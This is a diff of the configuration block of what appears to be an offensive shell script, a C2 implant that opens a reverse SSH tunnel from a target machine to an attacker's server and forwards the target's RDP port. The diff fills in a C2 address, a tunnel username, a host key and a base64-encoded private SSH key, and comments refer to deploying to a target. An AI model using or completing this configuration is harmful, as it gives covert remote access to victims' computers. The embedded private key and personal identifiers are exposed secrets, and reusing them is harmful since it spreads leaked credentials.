@@ -9,21 +9,21 @@
 ####################Config###################################################
 
 # Set these before deploying:
-C2_IP="C2_SERVER_IP"          # Your C2 IP or hostname
+C2_IP="192.168.0.213"          # Your C2 IP or hostname
 C2_PORT="8443"                 # C2 HTTP port
 C2_SSH_PORT="22"               # C2 SSH port for reverse tunnel
-C2_SSH_USER="tunnel"           # Unprivileged user on C2 that accepts tunnels
+C2_SSH_USER="hadareklund"           # Unprivileged user on C2 that accepts tunnels
 REVERSE_PORT="2222"            # Port on C2 that forwards to target RDP (3389)
 
 # Run: ssh-keyscan -H $C2_IP on your C2, paste the output line here.
 # Example: "|1|abc123...=|def456...= ecdsa-sha2-nistp256 AAAA..."
-C2_HOSTKEY="PASTE_SSH-KEYSCAN_OUTPUT_HERE"
+C2_HOSTKEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIE0zr3ZKYG8ttKm0McmRxcuUjqsAa9rh4pWb9kfy5Erm hadareklund@Hadars-MacBook-Air.local"
 
 # tunnel_id private key: base64-encode your private key file, paste here.
 # Generate with: ssh-keygen -t ed25519 -f tunnel_id -N ""
 # Encode with:   base64 -w0 tunnel_id
 # Add public key to C2: cat tunnel_id.pub >> /home/tunnel/.ssh/authorized_keys
-TUNNEL_KEY_B64="PASTE_BASE64_ENCODED_PRIVATE_KEY_HERE"
+TUNNEL_KEY_B64="LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFNd0FBQUF0emMyZ3RaVwpReU5UVXhPUUFBQUNCTk02OTJTbUJ2TGJTcHRESEprY1hMbEk2ckFHdmE0ZUtWbS9aSDh1Uks1Z0FBQUtpdEtTa2pyU2twCkl3QUFBQXR6YzJndFpXUXlOVFV4T1FBQUFDQk5NNjkyU21CdkxiU3B0REhKa2NYTGxJNnJBR3ZhNGVLVm0vWkg4dVJLNWcKQUFBRUJXcjV1Mzk3bzVHTW9oK0NYWWdPZDNzRmthZDdBaHhWZjJvY3FKUDdaUU5VMHpyM1pLWUc4dHRLbTBNY21SeGN1VQpqcXNBYTlyaDRwV2I5a2Z5NUVybUFBQUFKR2hoWkdGeVpXdHNkVzVrUUVoaFpHRnljeTFOWVdOQ2IyOXJMVUZwY2k1c2IyCk5oYkFFPQotLS0tLUVORCBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0K"
 
 # Keyboard language of TARGET machine (not attacker machine)
 # se=Swedish, de=German, us=English, fr=French, etc.
